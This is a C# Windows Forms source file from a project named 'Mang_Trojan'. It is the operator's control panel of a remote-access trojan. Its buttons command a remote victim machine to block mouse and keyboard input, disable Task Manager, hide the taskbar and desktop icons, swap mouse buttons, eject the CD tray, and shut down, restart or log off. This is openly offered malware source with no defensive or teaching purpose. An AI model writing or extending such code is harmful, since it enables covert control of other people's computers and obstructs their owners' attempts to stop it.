using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Mang_Trojan.form
{
    public partial class Fun : Form
    {
        RemoteObject.ScreenObject hostInstance;
        public Fun(RemoteObject.ScreenObject hostInstance)
        {
            InitializeComponent();
            this.hostInstance = hostInstance;
            this.Text ="Điều khiển "+ hostInstance.GetComputerName();
        }

        private void btnHideTaskBar_Click(object sender, EventArgs e)
        {
            hostInstance.HideTaskBar();
        }

        private void btnShowTaskBar_Click(object sender, EventArgs e)
        {
            hostInstance.ShowTaskBar();
        }

        private void btReverseMouse_Click(object sender, EventArgs e)
        {
            hostInstance.SwapMouse("SWITCH");
        }

        private void btRestoreMouse_Click(object sender, EventArgs e)
        {
            hostInstance.SwapMouse("RESTORE");
        }

       

        private void btBlockControl_Click(object sender, EventArgs e)
        {
            hostInstance.Block("BLOCK");
        }

        private void btRestoreControl_Click(object sender, EventArgs e)
        {
            hostInstance.Block("RESTORE");
        }

        private void btDisableTaskMng_Click(object sender, EventArgs e)
        {
            hostInstance.DisableTaskMgr();
        }

        private void btEnableMng_Click(object sender, EventArgs e)
        {
            hostInstance.EnableTaskMgr();
        }

        private void btOpenCd_Click(object sender, EventArgs e)
        {
            hostInstance.OpenCDRom("OPEN");
        }

        private void btCloseCD_Click(object sender, EventArgs e)
        {
            hostInstance.OpenCDRom("CLOSE");
        }

        private void btnShutdonwComp_Click(object sender, EventArgs e)
        {
            hostInstance.Shutdown("/s");
        }

        private void btnRestartComp_Click(object sender, EventArgs e)
        {
            hostInstance.Shutdown("/r");
        }

        private void btnLogOff_Click(object sender, EventArgs e)
        {
            hostInstance.Shutdown("/l");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void btHideIcon_Click(object sender, EventArgs e)
        {
            hostInstance.HideDeskTopIcon(true);
        }

        private void btResumeIcon_Click(object sender, EventArgs e)
        {
            hostInstance.HideDeskTopIcon(false);
        }
    }
}
